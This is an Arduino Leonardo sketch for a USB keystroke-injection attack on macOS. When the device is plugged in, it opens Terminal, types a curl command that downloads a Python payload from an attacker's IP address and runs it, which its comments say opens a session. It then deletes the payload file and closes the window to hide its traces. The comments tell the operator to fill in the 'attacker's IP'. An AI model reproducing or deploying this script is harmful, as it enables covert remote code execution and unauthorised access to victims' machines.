#include <phukdlib_leonardo.h>


#define upload "curl http://192.168.11.125:8081/test_mac/MacOS.py -o MacOS.py" // update attacker's IP, port, path to file and output file
#define shell "python MacOS.py" // update .py filename (output file)

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarOSX("terminal"); 
  Keyboard.write(KEY_RETURN);
  delay(2000);
  Keyboard.println(upload);
  delay(1000);
  Keyboard.write(KEY_RETURN);
  delay(800);
  Keyboard.println(shell);             // open payload file -> handling session
  delay(1000);
  Keyboard.write(KEY_RETURN);
  delay(2500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z'); 
  Keyboard.releaseAll();               // CTRL + Z for interrupt .py 
  delay(1000);
  Keyboard.println("rm MacOS.py");     // remove payload file
  delay(1000);
  Keyboard.write(KEY_RETURN);       
  delay(800);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();                // COMMAND + Q for close terminal
  delay(1500);
  delay (100500);
}






































